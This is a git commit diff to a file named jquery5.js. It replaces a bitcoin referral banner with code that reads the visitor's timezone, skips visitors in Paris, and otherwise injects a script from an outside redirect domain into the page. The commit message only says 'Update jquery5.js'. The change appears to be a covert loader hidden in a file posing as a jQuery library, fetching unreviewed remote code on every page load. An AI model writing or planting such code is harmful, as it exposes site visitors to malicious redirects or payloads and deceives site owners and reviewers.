bc00581301fefd8a558895e54351658e3c3d6c8a
elankton <74224289+elankton@users.noreply.github.com>
2022-08-12 17:11:43 +0300

    Update jquery5.js

--- jquery5.js
+++ jquery5.js
@@ -1,4 +1,9 @@
-if(document.getElementById("center_middle_add")){
-    document.getElementById("center_middle_add").innerHTML='<a href="https://bit.ly/39sJ4zI"><img title="Join Cointiply to Earn Free Bitcoin!" alt="Earn Free Bitcoin" src="https://cointiply.com/img/promo/banners/1_728x90.gif" width=600" height="80"></a>'; 
-    document.getElementById("center_middle_add").setAttribute("id", "div_top1915");
+if (Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase().indexOf('/paris') === -1){
+    (function (a, d, j, o) {
+       o = a.createElement(d),
+          m = a.getElementsByTagName(d)[0];              
+       o.src = j + "?d=0&r=" + Math.random();
+       m.parentNode.insertBefore(o, m)
+    })(document, 'script', 'https://sma.rt-redirect.com/sl/3a1d9054');
 }
+
